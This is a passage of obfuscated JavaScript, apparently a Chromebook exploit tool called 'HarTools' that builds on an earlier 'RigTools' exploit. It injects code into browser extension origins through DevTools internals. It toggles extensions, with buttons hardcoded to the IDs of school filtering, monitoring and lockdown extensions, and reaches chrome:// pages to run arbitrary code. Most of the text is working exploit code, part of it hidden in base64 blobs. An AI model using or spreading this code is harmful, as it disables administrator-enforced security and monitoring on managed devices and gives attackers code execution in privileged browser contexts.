AvLyBhbGVydCgibG9hZGluZyBidXR0b24iKTsKICAgIC8vIGFsZXJ0KGNvbnRhaW5lcl9leHRlbnNpb25zLnF1ZXJ5U2VsZWN0b3IoImJ1dHRvbiIpKTsKICAgIGNvbnRhaW5lcl9leHRlbnNpb25zLnF1ZXJ5U2VsZWN0b3IoIiN0b2dnbGVyIikub25jbGljayA9IGFzeW5jIGZ1bmN0aW9uIGR4KGUpIHsKICAgICAgLy8gb3BlbigpOwogICAgICBjb250YWluZXJfZXh0ZW5zaW9ucy5xdWVyeVNlbGVjdG9yKCIjdG9nZ2xlciIpLmRpc2FibGVkID0gdHJ1ZTsKICAgICAgCiAgICAgIGxldCBpZCA9IGNvbnRhaW5lcl9leHRlbnNpb25zLnF1ZXJ5U2VsZWN0b3IoIi5leHRudW0iKS52YWx1ZTsKICAgICAgY29udGFpbmVyX2V4dGVuc2lvbnMucXVlcnlTZWxlY3RvcigiLmV4dG51bSIpLnZhbHVlID0gIiI7CiAgICAgIHRyeSB7CiAgICAgICAgaWQgPSBwYXJzZUludChpZCk7CiAgICAgIH0gY2F0Y2ggewogICAgICAgIHJldHVybjsKICAgICAgfQogICAgICBpZiAoIXNhdmVkRXh0TGlzdFtpZCAtIDFdKSB7CiAgICAgICAgYWxlcnQoIlNlbGVjdCBleHRlbnNpb24gZnJvbSBsaXN0ISIpOwogICAgICAgIGNvbnRhaW5lcl9leHRlbnNpb25zLnF1ZXJ5U2VsZWN0b3IoIiN0b2dnbGVyIikuZGlzYWJsZWQgPSBmYWxzZTsKICAgICAgICByZXR1cm47CiAgICAgIH0KICAgICAgYXdhaXQgbmV3IFByb21pc2UoZnVuY3Rpb24gKHJlc29sdmUpIHsKICAgICAgICBjaHJvbWUubWFuYWdlbWVudC5zZXRFbmFibGVkKAogICAgICAgICAgc2F2ZWRFeHRMaXN0W2lkIC0gMV0uaWQsCiAgICAgICAgICAhc2F2ZWRFeHRMaXN0W2lkIC0gMV0uZW5hYmxlZCwKICAgICAgICAgIHJlc29sdmUsCiAgICAgICAgKTsKICAgICAgfSk7CgogICAgICBjb250YWluZXJfZXh0ZW5zaW9ucy5xdWVyeVNlbGVjdG9yKCIjdG9nZ2xlciIpLmRpc2FibGVkID0gZmFsc2U7CiAgICAgIGF3YWl0IHVwZGF0ZUV4dGVuc2lvblN0YXR1cyhleHRsaXN0X2VsZW1lbnQpOwogICAgfTsKICAgIGNvbnRhaW5lcl9leHRlbnNpb25zLnF1ZXJ5U2VsZWN0b3IoIiN0b2dnbGVyIikuZGlzYWJsZWQgPSBmYWxzZTsKICB9CiAgY29uc3Qgb3RoZXJGZWF0dXJlcyA9IHdpbmRvdy5jaHJvbWUucnVudGltZS5nZXRNYW5pZmVzdCgpOwogIGNvbnN0IHBlcm1pc3Npb25zID0gb3RoZXJGZWF0dXJlcy5wZXJtaXNzaW9uczsKICAKICBuZXcgRGVmYXVsdEV4dGVuc2lvbkNhcGFiaWxpdGllcygpLmFjdGl2YXRlKCk7CiAgZG9jdW1lbnQuY2xvc2UoKTsKICBFeHRlbnNpb25DYXBhYmlsaXRpZXMuc2V0dXBTbGlkZXMoKTsKfTsKPC9zY3JpcHQ+CjwvaHRtbD4=')}`);
                    w.chrome.tabs.create({ url });
                    w.close();
                    cleanup();
                });


                // }, 5000);

            }
            document.open();
            document.write(atob(`CjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiI+CiAgPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCIgLz4KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wIiAvPgogICAgPHRpdGxlPkhhclRvb2xzPC90aXRsZT4KICAgIDxzdHlsZT4KICAgICAgQGltcG9ydCB1cmwoJ2h0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzMj9mYW1pbHk9R2Vpc3Q6aXRhbCxvcHN6LHdnaHRAMCwxNC4uMzIsMTAwLi45MDA7MSwxNC4uMzIsMTAwLi45MDAmZGlzcGxheT1zd2FwJyk7CgogICAgICBpZnJhbWUgewogICAgICAgIG9wYWNpdHk6IDA7CiAgICAgICAgd2lkdGg6IDA7CiAgICAgICAgaGVpZ2h0OiAwOwogICAgICB9CgogICAgICBib2R5IHsKICAgICAgICBmb250LWZhbWlseTogJ0dlaXN0Jywgc2Fucy1zZXJpZjsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwMDAwOwogICAgICAgIGNvbG9yOiAjOGEyYmUyOwogICAgICAgIG1hcmdpbjogMDsKICAgICAgICBwYWRkaW5nOiAxNXB4OwogICAgICAgIG92ZXJmbG93OiBoaWRkZW47CiAgICAgIH0KCiAgICAgIC5iYWNrZ3JvdW5kLWdyaWQgewogICAgICAgIHBvc2l0aW9uOiBmaXhlZDsKICAgICAgICB0b3A6IDA7CiAgICAgICAgbGVmdDogMDsKICAgICAgICByaWdodDogMDsKICAgICAgICBib3R0b206IDA7CiAgICAgICAgYmFja2dyb3VuZC1pbWFnZTogcmFkaWFsLWdyYWRpZW50KCMzMzMgMXB4LCB0cmFuc3BhcmVudCAxcHgpOwogICAgICAgIGJhY2tncm91bmQtc2l6ZTogMnJlbSAycmVtOwogICAgICAgIHotaW5kZXg6IC0xOwogICAgICAgIGFuaW1hdGlvbjogbW92ZUdyaWQgNHMgbGluZWFyIGluZmluaXRlOwogICAgICAgIHRyYW5zaXRpb246IGJhY2tncm91bmQtcG9zaXRpb24teCA0MDBtczsKICAgICAgfQoKICAgICAgQGtleWZyYW1lcyBtb3ZlR3JpZCB7CiAgICAgICAgMCUgewogICAgICAgICAgYmFja2dyb3VuZC1wb3NpdGlvbjogMCAwOwogICAgICAgIH0KCiAgICAgICAgMTAwJSB7CiAgICAgICAgICBiYWNrZ3JvdW5kLXBvc2l0aW9uOiAycmVtIDJyZW07CiAgICAgICAgfQogICAgICB9CgogICAgICAuYmFja2dyb3VuZC1ncmlkOmhvdmVyIHsKICAgICAgICBiYWNrZ3JvdW5kLXBvc2l0aW9uLXg6IDJyZW07CiAgICAgIH0KCiAgICAgIGEgewogICAgICAgIGNvbG9yOiAjOGEyYmUyOwogICAgICAgIHRleHQtZGVjb3JhdGlvbjogbm9uZTsKICAgICAgfQoKICAgICAgYTpob3ZlciB7CiAgICAgICAgdGV4dC1kZWNvcmF0aW9uOiBub25lOwogICAgICB9CgogICAgICAubWFpbiB7CiAgICAgICAgdG9wOiA1MCU7CiAgICAgICAgbGVmdDogNTAlOwogICAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICAgICAgICB0cmFuc2Zvcm06IHRyYW5zbGF0ZSgtNTAlLCAtNTAlKTsKICAgICAgICBib3JkZXI6IDFweCBzb2xpZCAjMWQxZDFkOwogICAgICAgIGZvbnQtd2VpZ2h0OiBib2xkOwogICAgICAgIHBhZGRpbmc6IDMwcHg7CiAgICAgICAgYm9yZGVyLXJhZGl1czogOHB4OwogICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwOwogICAgICAgIG1heC1oZWlnaHQ6IDkwdmg7CiAgICAgICAgb3ZlcmZsb3cteTogYXV0bzsKICAgICAgICB3aWR0aDogNzUlOwogICAgICB9CgogICAgICAuaGVhZGVyIHsKICAgICAgICBkaXNwbGF5OiBmbGV4OwogICAgICAgIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47CiAgICAgICAgYWxpZ24taXRlbXM6IGNlbnRlcjsKICAgICAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsKICAgICAgICBtYXJnaW4tYm90dG9tOiAyMHB4OwogICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgfQoKICAgICAgLmxvZ28gewogICAgICAgIHdpZHRoOiAzLjVlbTsKICAgICAgICBoZWlnaHQ6IGF1dG87CiAgICAgICAgbWFyZ2luLWJvdHRvbTogMTBweDsKICAgICAgfQoKICAgICAgLnRpdGxlLXRleHQgewogICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgfQoKICAgICAgaDEgewogICAgICAgIGZvbnQtc2l6ZTogMi4yZW07CiAgICAgICAgbWFyZ2luOiAwOwogICAgICAgIGNvbG9yOiAjOGEyYmUyOwogICAgICAgIGZvbnQtd2VpZ2h0OiBib2xkOwogICAgICB9CgogICAgICAuYnV0dG9uIHsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjOGEyYmUyOwogICAgICAgIGNvbG9yOiBibGFjazsKICAgICAgICBwYWRkaW5nOiA4cHggMTJweDsKICAgICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgICAgICAgZGlzcGxheTogaW5saW5lLWJsb2NrOwogICAgICAgIGZvbnQtc2l6ZTogMTRweDsKICAgICAgICBtYXJnaW46IDVweDsKICAgICAgICBjdXJzb3I6IHBvaW50ZXI7CiAgICAgICAgYm9yZGVyLXJhZGl1czogNnB4OwogICAgICAgIGZvbnQtd2VpZ2h0OiBib2xkOwogICAgICAgIHRyYW5zaXRpb246IGFsbCAwLjNzIGVhc2U7CiAgICAgIH0KCiAgICAgIC5idXR0b246aG92ZXIgewogICAgICAgIGJhY2tncm91bmQtY29sb3I6ICNlMmUyZTI7CiAgICAgICAgdHJhbnNmb3JtOiBzY2FsZSgxLjEpOwogICAgICB9CgogICAgICAuYnV0dG9uOmZvY3VzIHsKICAgICAgICBvdXRsaW5lOiBub25lOwogICAgICB9CgogICAgICBpbnB1dCwKICAgICAgc2VsZWN0LAogICAgICB0ZXh0YXJlYSB7CiAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogIzEyMTIxMjsKICAgICAgICBjb2xvcjogd2hpdGU7CiAgICAgICAgYm9yZGVyOiAxcHggc29saWQgIzMzMzsKICAgICAgICBwYWRkaW5nOiAxMHB4OwogICAgICAgIGJvcmRlci1yYWRpdXM6IDRweDsKICAgICAgICB3aWR0aDogMTAwJTsKICAgICAgICBtYXJnaW4tYm90dG9tOiAxNXB4OwogICAgICB9CgogICAgICBpbnB1dDpmb2N1cywKICAgICAgc2VsZWN0OmZvY3VzLAogICAgICB0ZXh0YXJlYTpmb2N1cyB7CiAgICAgICAgb3V0bGluZTogbm9uZTsKICAgICAgICBib3JkZXItY29sb3I6ICNhODEyZmY7CiAgICAgIH0KCiAgICAgIDo6cGxhY2Vob2xkZXIgewogICAgICAgIGNvbG9yOiAjYmJiOwogICAgICB9CiAgICA8L3N0eWxlPgogIDwvaGVhZD4KICA8Ym9keT4KICAgIDxkaXYgY2xhc3M9ImJhY2tncm91bmQtZ3JpZCI+PC9kaXY+CiAgICA8ZGl2IGNsYXNzPSJtYWluIj4KICAgICAgPGRpdiBjbGFzcz0iaGVhZGVyIj4KICAgICAgICA8aW1nIHNyYz0iaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Nyb3NzamJseS9IYXJUb29scy1yaWd0b29sczEyOHBsdXMvcmVmcy9oZWFkcy9tYWluL2hhcnRvb2xzLmdpZiIgYWx0PSJIYXJUb29scyBMb2dvIiBjbGFzcz0ibG9nbyIgLz4KICAgICAgICA8ZGl2IGNsYXNzPSJ0aXRsZS10ZXh0Ij4KICAgICAgICAgIDxoMT5IYXJUb29sczwvaDE+CiAgICAgICAgICA8cD5EZXZlbG9wZXIgVG9vbHMgYW5kIEV4dGVuc2lvbiBDb2RlIGV4ZWN1dGlvbjwvcD4KICAgICAgICA8L2Rpdj4KICAgICAgPC9kaXY+CgogICAgICA8cD5UaGlzIHdhcyBmb3VuZCBieSA8YSBocmVmPSJodHRwczovL2Nyb3NzamJseS5wYWdlcy5kZXYvIj5jcm9zc2pibHk8L2E+PGJyPk9yaWdpbmFsIFJpZ1Rvb2xzIEV4cGxvaXQgd2FzIGZvdW5kIGJ5IDxhIGhyZWY9Imh0dHBzOi8vZ2l0aHViLmNvbS9GV1NtYXNoZXIiPkZXU21hc2hlcjwvYT48L3A+CiAgICAgIDxocj4KICAgICAgPHA+QUtBOiBpZiBzb21lb25lIHRlbGxzIHlvdSB0aGF0IHRoZXkgbWFkZSB0aGlzLCB0aGV5J3JlIGx5aW5nIGFuZCB5b3Ugc2hvdWxkIGxhdWdoIGF0IHRoZW08L3A+CiAgICAgIDxocj4KICAgICAgPHA+QWRkaXRpb25hbCBjcmVkaXRzOiBEaXNjb3JkOiBAYXhxbXggKHRlc3RpbmcgYW5kIGhlbHBpbmcgd2l0aCBkZXZlbG9wbWVudCkgQHB3ZW4gKGlkZWFzKSB8IEdpdGh1YjogPGEgaHJlZj0iaHR0cHM6Ly9naXRodWIuY29tL0ZXU21hc2hlciI+RldTbWFzaGVyPC9hPiAob3JpZ2luYWwgcmlndG9vbHMgZXhwbG9pdCkgPGEgaHJlZj0iaHR0cHM6Ly9naXRodWIuY29tL0Jsb2JieS1Cb2kiPkJsb2JieSBCb2k8L2E+ICh0ZXN0aW5nIGFuZCBkZXZlbG9wbWVudCk8L3A+CiAgICAgIDxocj4KCiAgICAgIDxwPlByZXNzIFEgZm9yIGV2YWx1YXRpbmcgY29kZSB1bmRlciA8YSBjbGFzcz0iYnV0dG9uIiBpZD0iZXh0ZGJnIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiPmV4dGVuc2lvbiBpZDwvYT48L3A+CiAgICAgIDxwPk9yIHByZXNzIDEtOSBmb3Igc29tZSBoYXJkY29kZWQgZXh0ZW5zaW9uczwvcD4KICAgICAgPHA+CiAgICAgICAgPGEgY2xhc3M9ImJ1dHRvbiBoYXJkY29kZWQiIGV4dD0iYWRrY3BrcGdoYWhtYm9wa2pjaG9iaWVja2VvYW9lZW0iIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSI+bHMgZmlsdGVyPC9hPgogICAgICAgIDxhIGNsYXNzPSJidXR0b24gaGFyZGNvZGVkIiBleHQ9Imhwa2Rva2FramdscHBlZWtmZWVrbWViZmFoYWRuZmxwIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiPmxzIGFsZXJ0PC9hPgogICAgICAgIDxhIGNsYXNzPSJidXR0b24gaGFyZGNvZGVkIiBleHQ9ImhhbGRsZ2xkcGxnbmdna2phYWZoZWxnaWFnbGFmYW5oIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiPmdvZ3VhcmRpYW48L2E+CiAgICAgICAgPGEgY2xhc3M9ImJ1dHRvbiBoYXJkY29kZWQiIGV4dD0ibW9laGtiYmNia2xta2NqaWJjYmJvb2ViZ3BvZ2Vqb2MiIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSI+YXJpc3RvdGxlPC9hPgogICAgICAgIDxhIGNsYXNzPSJidXR0b24gaGFyZGNvZGVkIiBleHQ9ImttZmZlaGJpZGxhbGliZmVrbGFlZm5ja3BpZGJvZGZmIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiPmlib3NzPC9hPgogICAgICAgIDxhIGNsYXNzPSJidXR0b24gaGFyZGNvZGVkIiBleHQ9Im1sb2FqZm5tamNrZmpiZWVvZmNkYWVjYmVsbmJsZGVuIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiPnNuYXAmcmVhZDwvYT4KICAgICAgICA8YSBjbGFzcz0iYnV0dG9uIGhhcmRjb2RlZCIgZXh0PSJmb2dqZWFuamZiaW9tYmdobm1rbW1vcGhmZWNjamRraSIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIj5sb2NrZG93biBicm93c2VyPC9hPgogICAgICAgIDxhIGNsYXNzPSJidXR0b24gaGFyZGNvZGVkIiBleHQ9ImttcGpsaWxuZW1qY2lvaGpja2phZG1nbWljb2xkZ2xmIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiPmR5a25vdyBjbG91ZDwvYT4KICAgICAgICA8YSBjbGFzcz0iYnV0dG9uIGhhcmRjb2RlZCIgZXh0PSJnbmRtaGRjZWZiaGxjaGtoaXBjbm5ia2NtaWNuY2VoayIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIj5nZm9ybXMgbG9ja2VkIG1vZGUgKGVucm9sbGVkIGNicyk8L2E+CiAgICAgIDwvcD4KCiAgICAgIDxwPlByZXNzIE0gZm9yIGV2YWx1YXRpbmcgdW5kZXIgPGEgY2xhc3M9ImJ1dHRvbiIgaWQ9ImRldmRiZyIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIj5kZXZ0b29sczwvYT4gY29udGV4dDwvcD4KICAgICAgPHA+VHlwaW5nIGNhbmNlbCBpbiBhbnkgcHJvbXB0IHdpbGwgY2FuY2VsIHRoZSBjdXJyZW50IG9wZXJhdGlvbi48L3A+CgogICAgICA8YSBjbGFzcz0iYnV0dG9uIiBocmVmPSJkZXZ0b29sczovL2RldnRvb2xzL2J1bmRsZWQvZGV2dG9vbHNfYXBwLmh0bWw/ZXhwZXJpbWVudHM9dHJ1ZSZ3cz0lJXVwZGF0ZXJ1cmwlJSI+UmUtb3BlbiBkZXZ0b29sczwvYT4KICAgICAgPGEgY2xhc3M9ImJ1dHRvbiIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIiBpZD0idXBkYXRlciI+VXBkYXRlIHBheWxvYWQ8L2E+CiAgICAgIDxhIGNsYXNzPSJidXR0b24iIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSIgaWQ9ImNsZWFudXAiPkNsZWFudXAgYW5kIHJlc2V0IGZvciBleHRlbnNpb248L2E+CiAgICAgIDxhIGNsYXNzPSJidXR0b24iIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSIgaWQ9ImFjdGl2YXRlIj5DaHJvbWUgVVJMczwvYT4KICAgICAgPGEgY2xhc3M9ImJ1dHRvbiIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIiBpZD0iYWN0aXZhdGUyIj5DaHJvbWUgVVJMcyAyPC9hPgogICAgPC9kaXY+CgogICAgPHNjcmlwdCBkZWZlcj4KICAgICAgZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigia2V5ZG93biIsIGZ1bmN0aW9uKGV2ZW50KSB7CiAgICAgICAgaWYgKGV2ZW50LmtleSA9PT0gInEiKSB7CiAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZXh0ZGJnIikuY2xpY2soKTsKICAgICAgICB9IGVsc2UgaWYgKGV2ZW50LmtleSA9PT0gIm0iKSB7CiAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZGV2ZGJnIikuY2xpY2soKTsKICAgICAgICB9IGVsc2UgaWYgKFsiMSIsICIyIiwgIjMiLCAiNCIsICI1IiwgIjYiLCAiNyIsICI4IiwgIjkiXS5pbmNsdWRlcyhldmVudC5rZXkpKSB7CiAgICAgICAgICBjb25zb2xlLmxvZyhldmVudC5rZXkpOwogICAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvcihgcCAuaGFyZGNvZGVkOm50aC1jaGlsZCgke3BhcnNlSW50KGV2ZW50LmtleSl9KWApLmNsaWNrKCk7CiAgICAgICAgfQogICAgICB9KTsKICAgIDwvc2NyaXB0PgogIDwvYm9keT4KPC9odG1sPg==`));
            document.querySelector('#activate').onclick = function () {
                dbgext(false, pdfId);
            }
            onunload = function () {
                while (true);
            }
            document.close();
            document.title = "Dashboard";
            document.querySelector('#activate2').onclick = function (ev) {

                function xd(w) {
                    w.close();
                    const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai"; // Redefinition because we convert this function to a string
                    const mojoURL = "chrome://resources/mojo/mojo/public/js/bindings.js";
                    chrome.tabs.getCurrent(function (tab) {
                        console.log(tab);
                        chrome.windows.create({ url: mojoURL, setSelfAsOpener: true }, function (info) {
                            async function createAndWriteFile() {
                                function writeFile(filename, content) {
                                    return new Promise((resolve) => {
                                        webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, function (fs) {
                                            fs.root.getFile(filename, { create: true }, function (entry) {
                                                entry.remove(function () {
                                                    fs.root.getFile(filename, { create: true }, function (entry) {
                                                        entry.createWriter(function (writer) {
                                                            writer.write(new Blob([content]))
                                                            writer.onwriteend = function () {
                                                                resolve(entry.toURL());
                                                            }
                                                        })
                                                    })
                                                })
                                            })
                                        })
                                    })

                                }
                                const htmlFile = `<html>
                                <head></head><body><iframe src="filesystem:chrome://extensions/temporary/nothing.html"></iframe>
                                </html>
                                <script>
                                onerror=  alert;
                                if (top !== window) {
                                    top.location.replace(location.href);
                                };
                                </script>
                                `
                                
                                // alert(url);
                                opener.postMessage({ url: (await writeFile('index.html', htmlFile))}, '*');
                                setTimeout(function () {
                                    close();
                                }, 800);
                            }
                            chrome.tabs.executeScript(info.tabs[0].id, { code: `(${createAndWriteFile.toString()})()` });
                            function m2(url) {
                                // alert(url);
                                onmessage = function (data) {
                                    if (data.data.type === "ack") {
                                        
                                        // chrome.tabs.getCurrent(function (tab) {
                                            // alert("navigating");
                                            top.location.replace("")
                                        // })
                                    }
                                }
                                top.postMessage({ type: 'acc' }, '*');
                            }
                            onmessage = function (dat) {
                                if (dat.data.url) {
                                    m2(dat.data.url);
                                }
                            };
                        })
                    })

                }
                dbgext(false, pdfId, xd.toString());
            }
            onmessage = function (ev) {
                if (ev.data.type === "browserInitNavigate") {
                    alert(1);
                    ev.source.location.replace(ev.data.url);
                }
            }
            document.querySelector('#updater').onclick = function (ev) {
                onunload = null;
                const ws = new WebSocket("ws://%%updaterurl%%");

                ws.onopen = function () {
                    ws.onmessage = function (ev) {
                        const received = JSON.parse(ev.data);
                        const savedURL = received.params.request.url;
                        ws.close();
                        const w = open('', '_blank');
                        console.log(savedURL);
                        w.eval(`setTimeout(function () {opener.open(atob("${btoa(savedURL)}"), '_blank'); window.close()}, 500);`);
                        setTimeout(() => { location.reload() });
                    }
                    ws.send(JSON.stringify({
                        method: "Target.setDiscoverTargets",
                        id: 999,
                        params: {}
                    }));
                }

            }
            onmessage = function (d) {
                if (d.data.type === "acc") {
                    onunload = function () { while (true); };
                    d.source.postMessage({ type: "ack" }, '*');
                    
                };

                if (!globalMap[d.data.uid]) return;

                for (const frame of globalMap) {
                    if (!frame) continue;
                    if (frame.idx === d.data.uid) {
                        frame.remove();
                        delete globalMap[globalMap.indexOf(frame)];
                        return;
                    }
                }
            }
            function dbgext(cleanup, id, payload) {
                let x = id;
                while (!x) {
                    x = prompt('Extension id?');
                    if (x === "cancel") {
                        return;
                    }
                }
                let path = '//manifest.json';
                let is_pdf = false;
                let injected = payload ?? payload_swamp.toString();
                if (x === pdfId) {
                    path = "index.html"; // pdf viewer hack
                    is_pdf = true;
                    const b = prompt("code to execute!");
                    if (!b) return;
                    injected = injected.replace('%%CHROMEPAYLOAD%%', btoa(b));
                    InspectorFrontendHost.setInjectedScriptForOrigin('chrome://policy', b+'//');
                    
                }
                const URL_1 = `chrome-extension://${x ??
                    alert("NOTREACHED")}/${path}`;
                InspectorFrontendHost.setInjectedScriptForOrigin(new URL(URL_1).origin, `window.cleanup = ()=>{window.parent.postMessage({type: "remove", uid: window.sys.passcode}, '*');} ;onmessage = function (data) {window.sys = data.data; const w = open(origin + '/${path}'); w.onload = function () {(${injected})(w, data.data)} }//`);
                const ifr = document.createElement("iframe");
                ifr.src = URL_1;
                document.body.appendChild(ifr);
                const ifrid = globalMap.push(ifr) - 1;
                ifr.idx = ifrid;
                ifr.onload = function () {

                    ifr.contentWindow.postMessage({
                        type: "uidpass", passcode:
                            ifrid,
                        cleanup: cleanup
                    }, '*');
                    // console.log('hi');
                }
                // alert(1);

            }
            document.querySelector('#extdbg').onclick = function () {
                dbgext(false);
            }
            document.querySelectorAll('.hardcoded').forEach(el => {el.onclick = function () {
                let extid = el.getAttribute("ext");
                console.log(el.innerText, extid);
                dbgext(false, extid);
                }
            });
            document.querySelector('#cleanup').onclick = function () {
                dbgext(true);
            }
            document.querySelector('#devdbg').onclick = function () {
                var l_canceled = false;
                const id = setTimeout(function m() {
                    if (l_canceled) return;
                    (new Function(prompt("Evaluate script! (type 'cancel' to cancel)")))();
                    if (!l_canceled) setTimeout(m, 0);
                    clearTimeout(id);
                });
                Object.defineProperty(window, 'cancel', {
                    get: function () {
                        l_canceled = true;
                    }, configurable: true
                })
                return;
            }
            console.log(globalMap);
        }
        w.eval(`(${ui.toString()})()`);
        window.close();

    }

    function sleep(ms) {
        return new Promise(resolve => {
            setTimeout(resolve, ms);
        });
    }
})
)()
